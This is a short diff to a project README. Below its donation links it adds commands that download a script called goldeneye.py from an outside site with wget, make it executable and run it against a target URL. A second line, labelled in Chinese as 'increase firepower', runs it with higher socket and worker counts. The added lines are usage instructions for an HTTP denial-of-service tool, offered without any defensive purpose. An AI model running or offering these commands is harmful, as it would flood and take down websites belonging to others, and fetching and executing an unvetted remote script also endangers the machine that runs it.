@@ -137,3 +137,12 @@ pip install -r requirements.txt
 **💰 Donation Links:**
 * https://idpay.ir/mh-prodev
 
+wget http://www.ityinhu.com/api/ddjb/goldeneye.py
+chmod +x goldeneye.py
+./goldeneye.py 网址
+
+
+增强火力
+./goldeneye.py 网址 -s 300 -w 300
+
+
